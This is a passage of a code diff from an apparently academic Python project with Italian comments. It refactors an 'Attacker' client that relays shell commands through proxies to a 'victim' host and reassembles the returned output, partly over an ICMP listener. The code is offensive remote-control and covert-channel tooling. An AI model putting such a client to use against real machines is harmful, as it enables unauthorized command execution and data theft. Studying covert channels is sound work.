-                chosen_proxy=random.choice(self.proxy_list)
-                #print(f"Il proxy scelto è: {chosen_proxy}")
-            except Exception as e:
-                print(f"send_command_to_victim: {e}") 
-                continue
-            print(f"Il comando {command} verrà mandato al proxy {chosen_proxy}") 
-            socket= self.connected_proxy.Proxy_Socket.get(chosen_proxy.compressed)
-            data=(MSG.CONFIRM_COMMAND+command)
-            socket.sendall(data.encode())
-            print(f"Gli altri proxy ascolteranno direttamente la vititma")
-            for proxy in self.connected_proxy.proxy_list:
-                if proxy!=chosen_proxy :
-                    socket= self.connected_proxy.Proxy_Socket.get(proxy.compressed)
-                    socket.sendall(MSG.WAIT_DATA.encode()) 
-            self.icmp_thread.wait_Thread() 
-            print("Separazione dati per SEQ") 
-            try:
-                print("ABCDEFG: ",self.received_data)
-                self.dati_separati= Methods_Analyze_Data.separa_dati_byID(self.received_data) 
-                print("ABCDEFG: ",self.dati_separati)
-            except Exception as e:
-                print(f"send_command_to_victim separa: {e}")
-            #print("\n***dati_separati: ", self.dati_separati) 
-            print("Dati separati per Sequenza")   
-            try:
-                payload=Methods_Analyze_Data.unisciDati(self.dati_separati)
-                print(payload)
-            except Exception as e:
-                print("aiuto eccezzione: ",e) 
-            
-            #reset thread and reset received_data
-            self.reset_variables()
-            command=input(msg) 
+            print(f"Il comando immesso è: {command}") 
+            try: 
+                send_command() 
+                print("Attesa dei dati dai proxy...") 
+                for thread in self.thread_waitData.values(): 
+                    thread.join() 
+                print("Tutti i dati ricevuti dai proxy") 
+                self.data_received=get_received_data() 
+                print("Dati ricevuti: ",self.data_received) 
+                self.dati_separati= DATA.METHODS.separa_dati(SEPARAZIONE_DATI.ID, self.data_received) 
+                print("Dati separati: ",self.dati_separati) 
+                #print("\n***dati_separati: ", self.dati_separati) 
+                print("Dati separati per Sequenza")    
+                payload=DATA.METHODS.unisci_dati(self.dati_separati)
+                print(payload) 
+                #reset thread and reset data_received
+                reset_variables()
+                command=input(msg) 
+            except Exception as e: 
+                print(e) 
+                exit(-1)
         print("Uscita dalla shell\texit")  
-        for proxy in self.proxy_list:
-            socket_proxy=self.dict_proxy_socket.get(proxy.compressed)
-            socket_proxy.sendall(MSG.END_COMMUNICATION.encode()) 
-            socket_proxy.close()
-
-    def wait_data_from_proxy(self,proxy:ipaddress.IPv4Address|ipaddress.IPv6Address):  
-        print("wait_data_from_proxy")
-        self.data_lock.acquire()
-        proxy_data=self.received_data.get(proxy.compressed)
-        self.data_lock.release() 
-        proxy_socket=self.dict_proxy_socket.get(proxy.compressed) 
-        while(data:=proxy_socket.recv(1024)):  
-            #print("proxy_data: ",proxy_data)
-            self.data_lock.acquire() 
-            proxy_data.append(data) 
-            self.data_lock.release()
-            print(f"Received from proxy: {proxy_data}")
-            if MSG.LAST_PACKET.encode() in data:
-                break
-        print("Received all data") 
-        return 
-    
-    def reset_variables(self): 
-        self.thread_list={}
-        self.dati_separati={}
-        self.received_data:dict[str,list]={}
-        for proxy in self.proxy_list: 
-            if not isinstance(proxy, ipaddress.IPv4Address) and not isinstance(proxy, ipaddress.IPv6Address):
-                print(f"***\t{proxy} non è un indirizzo valido")
-                continue
-            self.received_data.update({proxy.compressed:[]}) 
-            thread=threading.Thread(
-                target=self.wait_data_from_proxy 
-                ,args=[proxy]
-            )
-            thread.name=f"Thread-{proxy.compressed}"
-            self.thread_list.update({proxy.compressed:thread})
-        for proxy in self.proxy_list:
-            self.event_thread_update.get(proxy.compressed).clear() 
-        for thread in self.thread_list.values():
-            thread.start() 
-        #if want_to_choose_new_attack():
-        #    self.attack_function=choose_new_attack() 
-        #if want_to_choose_new_victim:
-        #   self.ip_vittima= choose_new_victim()  
+        for proxy in self.proxy_list.values(): 
+            with self.lock_proxy_list:
+                socket_proxy=self.proxy_list.get(proxy.compressed).socket 
+            try: 
+                socket_proxy.sendall(MSG.END_COMMUNICATION.value.encode()) 
+                socket_proxy.close() 
+            except Exception as e: 
+                print(f"send_command_to_victim-> ",e)
+                print(f"Errore durante la chiusura della connessione con proxy {proxy}")
 
 if __name__=="__main__": 
-    attacker=Attacker() 
-    attacker.send_command_to_victim()
+    args=ARGS_CONFIG.FROM_COMMAND().args
+    if not IS_TYPE.namespace(args): 
+        exit(-1) 
+    if not IS_TYPE.string(args.file_path):
+        config_args=ARGS_CONFIG.FROM_FILE(args.file_path) 
+    else: config_args=ARGS_CONFIG.FROM_FILE(None) 
+    attacker=Attacker(config_args) 
+    attacker.start()
